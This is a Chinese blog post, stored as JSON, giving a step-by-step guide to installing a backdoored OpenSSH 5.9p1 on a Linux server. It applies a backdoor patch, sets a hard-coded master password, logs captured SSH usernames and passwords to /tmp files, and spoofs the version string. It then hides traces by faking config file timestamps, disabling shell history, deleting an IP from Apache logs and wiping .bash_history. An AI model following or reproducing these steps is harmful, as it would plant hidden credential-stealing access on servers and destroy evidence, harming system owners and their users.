{"title":"SSH后门复现","slug":"SSH后门复现","date":"2018-05-15T12:01:46.000Z","updated":"2018-05-15T12:05:51.030Z","comments":true,"excerpt":"","content":"<p>#SSH后门复现</p>\n<h3 id=\"最开始先查看自己的ssh版本\"><a href=\"#最开始先查看自己的ssh版本\" class=\"headerlink\" title=\"最开始先查看自己的ssh版本\"></a>最开始先查看自己的ssh版本</h3><pre><code>ssh -v\n</code></pre><h3 id=\"然后下载openssh和ssh后门\"><a href=\"#然后下载openssh和ssh后门\" class=\"headerlink\" title=\"然后下载openssh和ssh后门\"></a>然后下载openssh和ssh后门</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://down1.chinaunix.net/distfiles/openssh-5.9p1.tar.gz</span><br><span class=\"line\">wget http://openbsd.org.ar/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz</span><br><span class=\"line\">tar zxvf openssh-5.9p1.tar.gz</span><br><span class=\"line\">tar zxvf 0x06-openssh-5.9p1.patch.tar.gz</span><br><span class=\"line\">cd openssh-5.9p1.patch/</span><br><span class=\"line\">cp sshbd5.9p1.diff ../openssh-5.9p1</span><br><span class=\"line\">cd ../openssh-5.9p1</span><br><span class=\"line\">patch &lt; sshbd5.9p1.diff   //patch  后门</span><br></pre></td></tr></table></figure>\n<p>这时有可能出现报错信息<br><strong>-bash: patch: command not found</strong><br>代表没有安装patch命令包，解决方案：</p>\n<pre><code>yum -y install patch\n</code></pre><h3 id=\"备份SSH原始配置文件\"><a href=\"#备份SSH原始配置文件\" class=\"headerlink\" title=\"备份SSH原始配置文件\"></a>备份SSH原始配置文件</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old</span><br><span class=\"line\">mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old</span><br></pre></td></tr></table></figure>\n<h3 id=\"修改后门密码，和记录文件的位置\"><a href=\"#修改后门密码，和记录文件的位置\" class=\"headerlink\" title=\"修改后门密码，和记录文件的位置\"></a>修改后门密码，和记录文件的位置</h3><pre><code>vi includes.h\n</code></pre><p>找到并修改<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#define ILOG &quot;/tmp/ilog&quot;</span><br><span class=\"line\">//记录登录到本机的用户名和密码</span><br><span class=\"line\">#define OLOG &quot;/tmp/olog&quot;</span><br><span class=\"line\">//记录本机登录到远程的用户名和密码</span><br><span class=\"line\">#define SECRETPW &quot;fdrag0n&quot;</span><br><span class=\"line\">//你后门的密码</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"修改SSH版本信息，改为第一步看到的\"><a href=\"#修改SSH版本信息，改为第一步看到的\" class=\"headerlink\" title=\"修改SSH版本信息，改为第一步看到的\"></a>修改SSH版本信息，改为第一步看到的</h3><pre><code>vi version.h\n</code></pre><h3 id=\"环境配置\"><a href=\"#环境配置\" class=\"headerlink\" title=\"环境配置\"></a>环境配置</h3><p>如果没有以上环境有可能会报错</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y gcc</span><br><span class=\"line\">yum install -y openssl openssl-devel pam-devel</span><br><span class=\"line\">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5</span><br></pre></td></tr></table></figure>\n<p>如果出现报错信息中带有：<br><strong>configure: error:  zlib.h missing – please install first or check config.log</strong>之类的信息<br>安装zib</p>\n<pre><code>yum install -y zlib\n</code></pre><h3 id=\"安装并重启SSH\"><a href=\"#安装并重启SSH\" class=\"headerlink\" title=\"安装并重启SSH\"></a>安装并重启SSH</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">make &amp;&amp; make install</span><br><span class=\"line\">service sshd restart</span><br></pre></td></tr></table></figure>\n<h3 id=\"简单处理记录\"><a href=\"#简单处理记录\" class=\"headerlink\" title=\"简单处理记录\"></a>简单处理记录</h3><h4 id=\"还原新配置文件为旧配置文件时间\"><a href=\"#还原新配置文件为旧配置文件时间\" class=\"headerlink\" title=\"还原新配置文件为旧配置文件时间\"></a>还原新配置文件为旧配置文件时间</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">touch -r/etc/ssh/ssh_config.old /etc/ssh/ssh_config</span><br><span class=\"line\">touch -r/etc/ssh/sshd_config.old /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>\n<p>将ssh_config和sshd_config修改时间跟ssh_config.old和sshd_config.old一致，减少被发现的概率。</p>\n<h4 id=\"清除apache日志\"><a href=\"#清除apache日志\" class=\"headerlink\" title=\"清除apache日志\"></a>清除apache日志</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export HISTFILE=/dev/null </span><br><span class=\"line\">export HISTSIZE=0 </span><br><span class=\"line\">cd /etc/httpd/logs/ </span><br><span class=\"line\">sed -i ‘/192.168.52.175/d’ access_log* </span><br><span class=\"line\">echo &gt;/root/.bash_history //清空操作日志</span><br></pre></td></tr></table></figure>\n<h4 id=\"清除用户目录下的-bash-history文件\"><a href=\"#清除用户目录下的-bash-history文件\" class=\"headerlink\" title=\"清除用户目录下的.bash_history文件\"></a>清除用户目录下的.bash_history文件</h4><pre><code>vi .bash_history\n</code></pre><p>然后全部删除保存。</p>\n","categories":[],"tags":[]}